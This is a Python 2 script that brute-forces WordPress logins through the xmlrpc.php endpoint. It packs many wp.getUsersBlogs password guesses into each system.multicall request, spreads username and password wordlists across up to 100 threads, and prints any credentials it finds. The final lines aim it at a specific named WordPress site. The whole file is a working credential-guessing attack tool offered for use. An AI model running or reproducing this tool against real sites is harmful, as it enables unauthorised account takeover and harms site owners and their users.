from xmlrpclib import ServerProxy, MultiCall, ProtocolError, Fault
from threading import Thread
from sys import stdout

# safe print for threading
print_safe = lambda x: stdout.write("%s\n" % x)

class AttackThread(Thread):

    def __init__(self, xmlrpc_endpoint, username, passwords, multicall_limit=10, name=None):
        super(AttackThread, self).__init__()

        self.target = xmlrpc_endpoint
        self.multicall_limit = multicall_limit
        self.username = username
        self.passwords = passwords
        self.name = name

        self.proxy = ServerProxy(self.target)


    def execute(self):
        request_count = 0
        multicall = MultiCall(self.proxy)

        for password_index, password in enumerate(self.passwords):

            if (request_count < self.multicall_limit) and (password_index < len(self.passwords) - 1):
                multicall.wp.getUsersBlogs(self.username, password)
                request_count += 1
            else:
                for req_id, result in enumerate(multicall().results):
                    if type(result) == type([]):
                        credentials = multicall._MultiCall__call_list[req_id][1]
                        print_safe(result)
                        print_safe("Credentials Found: (%s, %s)" % credentials)
                        return

                multicall = MultiCall(self.proxy)
                request_count = 0

    def run(self):
        self.execute()
        #print_safe(self.name)


class Attack:

    def __init__(self, target, num_threads=1, multicall_limit=10):
        self.target = target
        self.multicall_limit = 10
        self.num_threads = num_threads

        self.usernames = []
        self.passwords = []
        self.threads = []

        if not self.test_endpoint:
            raise Exception("Invalid XMLRPC Endpoint")

    def test_endpoint(self):
        proxy = ServerProxy(self.target)
        try:
            proxy.system.listMethods()
            return True
        except ProtocolError, error:
            if error.errcode == 404:
                return False

    def load_usernames(self, file):
        with open(file) as f:
            self.usernames = f.read().splitlines()
            f.close()

    def load_passwords(self, file):
        with open(file) as f:
            self.passwords = f.read().splitlines()
            f.close()

    def execute(self):
        batch_size = len(self.passwords) / self.num_threads

        if batch_size == 0:
            batch_size = len(self.passwords)

        for username in self.usernames:
            batch_number = 0

            for i in xrange(self.num_threads):
                lower_index = batch_number * batch_size
                upper_index = lower_index + batch_size

                if upper_index >= len(self.passwords):
                    upper_index = len(self.passwords)

                thread = AttackThread(
                        self.target, username, self.passwords[lower_index:upper_index], self.multicall_limit,
                            name="Username:%s - Passwords:%d to %d" % (username, lower_index, upper_index)
                        )
                self.threads.append(thread)
                thread.start()

                batch_number += 1

        print "Number of Threads Spawned: %d" % len(self.threads)

attack = Attack("http://wp.soliman.io/xmlrpc.php", num_threads=100, multicall_limit=100)
attack.load_usernames("usernames.txt")
attack.load_passwords("passwords.txt")
attack.execute()
